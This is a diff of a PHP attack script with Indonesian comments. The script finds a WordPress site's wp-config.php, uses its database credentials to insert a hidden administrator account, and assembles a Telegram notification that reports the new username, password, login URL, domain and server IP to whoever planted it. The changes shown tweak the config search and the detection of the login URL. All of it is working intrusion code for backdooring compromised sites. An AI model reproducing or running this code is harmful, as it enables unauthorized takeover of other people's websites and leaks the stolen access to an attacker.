@@ -8,24 +8,27 @@ $user  = $_POST['wp_user']  ?? 'subadmin';
 $pass  = $_POST['wp_pass']  ?? 'Asdf1234@@';
 $email = $_POST['wp_email'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
 
-$target_subdomain = 'bloglegalcops';   // Pastikan ini benar
+// =============================================
+// AUTO DETECT SUBDOMAIN
+// =============================================
+$target_subdomain = 'bloglegalcops';   // GANTI kalau foldernya beda
 
 $currentDir = dirname(__FILE__);
 $found_config = false;
 
-// Priority scanning
-$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname($currentDir);
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
 $paths_to_check = [
     $doc_root . "/$target_subdomain/wp-config.php",
-    $currentDir . '/wp-config.php',
-    $doc_root . "/$target_subdomain/",
     dirname($doc_root) . "/$target_subdomain/wp-config.php",
+    $doc_root . "/$target_subdomain/",
+    $currentDir . '/wp-config.php',
+    $currentDir . "/$target_subdomain/wp-config.php",
     $currentDir . "/..",
     $currentDir . "/../..",
 ];
 
 foreach ($paths_to_check as $path) {
-    $check_file = is_dir($path) ? rtrim($path, '/') . '/wp-config.php' : $path;
+    $check_file = is_dir($path) ? $path . '/wp-config.php' : $path;
     if (file_exists($check_file)) {
         $found_config = $check_file;
         break;
@@ -68,30 +71,30 @@ if ($found_config) {
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
 
-            // === AMBIL SITEURL DARI DATABASE (INI YANG PALING AKURAT) ===
+            // === LOGIN URL DARI DATABASE (PALING PENTING) ===
             $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
-            $home_result    = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'home' LIMIT 1");
-
-            $siteurl = '';
+            
+            $login_url = "";
             if ($siteurl_result && $siteurl_result->num_rows > 0) {
                 $row = $siteurl_result->fetch_assoc();
                 $siteurl = rtrim($row['option_value'], '/');
-            } elseif ($home_result && $home_result->num_rows > 0) {
-                $row = $home_result->fetch_assoc();
-                $siteurl = rtrim($row['option_value'], '/');
+                $login_url = $siteurl . "/wp-login.php";
+            } 
+            
+            // Fallback kalau siteurl kosong
+            if (empty($login_url)) {
+                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+                $domain = $_SERVER['HTTP_HOST'];
+                $login_url = $protocol . $domain . "/wp-login.php";
             }
-
-            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-            $login_url = $siteurl ? $siteurl . "/wp-login.php" : $protocol . $_SERVER['HTTP_HOST'] . "/wp-login.php";
 
             // Telegram Notification
             $text = "💎 *INI YA LOGINAN WP NYA!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
-            $text .= "🌐 *Domain:* " . ($siteurl ? str_replace(['http://','https://'], '', $siteurl) : $_SERVER['HTTP_HOST']) . "\n";
+            $text .= "🌐 *Domain:* " . $_SERVER['HTTP_HOST'] . "\n";
             $text .= "🗃 *wp-config:* " . $found_config . "\n";
-            $text .= "📍 *Script Path:* " . __FILE__ . "\n";
             $text .= "🛰 *IP:* " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
             $text .= "📅 *Time:* " . date('Y-m-d H:i:s') . "\n";
 
@@ -105,7 +108,7 @@ if ($found_config) {
 
             echo "✅ <b>SUCCESS!</b> Admin '$user' berhasil di-inject!<br>";
             echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br>";
-            echo "<small>Domain: " . htmlspecialchars($siteurl ?: $_SERVER['HTTP_HOST']) . "</small>";
+            echo "<small>wp-config: " . htmlspecialchars($found_config) . "</small>";
         } else {
             echo "ERROR Query: " . $conn->error;
         }
